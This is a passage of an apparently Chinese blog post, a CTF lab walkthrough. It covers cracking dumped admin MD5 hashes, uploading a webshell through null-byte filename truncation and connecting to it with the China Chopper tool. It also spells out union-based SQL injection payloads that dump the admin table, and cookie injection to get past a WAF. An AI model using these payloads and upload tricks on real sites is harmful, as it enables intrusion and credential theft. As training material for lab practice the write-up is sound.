+<p>点击检测字段，再把password和admin勾选上：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps31.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps32.jpg" alt="img"></p>
+<p>点击检测内容：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps33.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps34.jpg" alt="img"></p>
+<p>结果出现两组账号密码，我们任选其中一组就行：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps35.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps36.jpg" alt="img"></p>
+<p>在这里，我选择了上面一种，双击，出现账号和密码：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps37.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps38.png" alt="img"></p>
+<p>我们发现密码好像被MD5加密过了，于是，我们解密一下：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps39.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps40.jpg" alt="img"></p>
+<p>用获取的账号和密码进行登录：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps41.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps42.png" alt="img"></p>
+<p>成功登录：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps43.jpg" alt="img"><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps44.jpg" alt="img"></p>
+<p>上传木马:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps45.jpg" alt="img"> </p>
+<p>文件上传成功：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps46.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps47.jpg" alt="img"> </p>
+<p>在保存信息的路径下添加888.asp.jpg，在16进制数中找到asp后的.进行00截断。将2e改为00</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps48.jpg" alt="img"> </p>
+<p>输入保存路径+888.asp打开网页显示木马添加成功</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps49.jpg" alt="img"> </p>
+<p>打开菜刀，将木马路径输入进去</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps50.jpg" alt="img"> </p>
+<p>双击网址，打开即可看到任意盘下的文件并进行更改</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps51.jpg" alt="img"></p>
+<p>3.尤里的复仇1 sql注入</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps52.jpg" alt="img"> </p>
+<p>一、判断是否存在SQL注入漏洞:</p>
+<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps53.jpg" alt="img"> </p>
+<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
+<p>2.构造 and 1&#x3D;2</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps54.jpg" alt="img"> </p>
+<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
+<p>二、判断字段数</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps55.jpg" alt="img"> </p>
+<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps56.jpg" alt="img"> </p>
+<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps57.jpg" alt="img"> </p>
+<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
+<p>三、判断回显点</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps58.jpg" alt="img"> </p>
+<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
+<p>四、查询相关内容</p>
+<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps59.jpg" alt="img"> </p>
+<p>页面回显maoshe</p>
+<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps60.jpg" alt="img"> </p>
+<p>回显版本号为5.5.53</p>
+<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps61.jpg" alt="img"> </p>
+<p>页面回显admin</p>
+<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
+<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps62.jpg" alt="img"> </p>
+<p>回显字段名为id</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps63.jpg" alt="img"> </p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps64.jpg" alt="img"> </p>
+<p>回显password</p>
+<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps65.jpg" alt="img"> </p>
+<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
+<p>顺利得到flag</p>
+<ol start="4">
+<li>尤里的复仇2 信息收集1</li>
+</ol>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps66.jpg" alt="img"> </p>
+<p>用御剑进行扫描，flag在二级目录里</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps67.jpg" alt="img"> </p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps68.jpg" alt="img"> </p>
+<p>点击链接，得到flag</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps69.jpg" alt="img"> </p>
+<p>5.尤里的复仇 绕过WAF</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps70.jpg" alt="img"> </p>
+<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入。</p>
+<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字。</p>
+<p>因为网页做了waf过滤防护，这里我们考虑用cookie注入，可以进行绕过：</p>
+<p>这里我们使用一个小工具进行注入</p>
+<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps71.jpg" alt="img"> </p>
+<p>出现账号和密码：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps72.jpg" alt="img"> </p>
+<p>将密码md5解密：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps73.jpg" alt="img"> </p>
+<p>用御剑进行扫描，获得后台地址：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps74.jpg" alt="img"> </p>
+<p>输入之前获得的用户名和密码：</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps75.jpg" alt="img"> </p>
+<p>成功拿到flag:</p>
+<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps76.jpg" alt="img"> </p>
+]]></content>
   </entry>
 </search>
